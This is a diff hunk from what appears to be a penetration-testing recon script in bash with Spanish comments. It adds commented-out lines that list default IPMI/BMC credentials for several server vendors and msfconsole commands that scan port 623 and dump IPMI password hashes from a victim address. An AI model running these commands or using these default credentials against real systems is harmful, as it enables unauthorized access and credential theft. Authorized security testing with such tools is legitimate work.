@@ -209,6 +209,13 @@ fi
 echo " "
 echo " "
 
+# Puerto 623 IPMI 2  ilo, idrac etc...
+# echo -e "${BLUE}[-] Port 623 try, IDRAC root:calvin  Supermicro ADMIN:ADMIN IBM IMM USERID:PASSW0RD Fujitsu admin:admin Oracle/Sun root:changeme ASUS iKVM BNC admin:admin.${NC}"
+# echo -e "${BLUE}[-] Trying to dump hash...${NC}"
+# msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS $ipvictima; run; exit" && msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes set RHOSTS $ipvictima; run; exit"
+#
+
+
 # echo -e "${YELLOW}[+] Searching exploitdb...${NC}"
 # searchsploit --nmap ResultNmap$nombre --id
 # echo " "
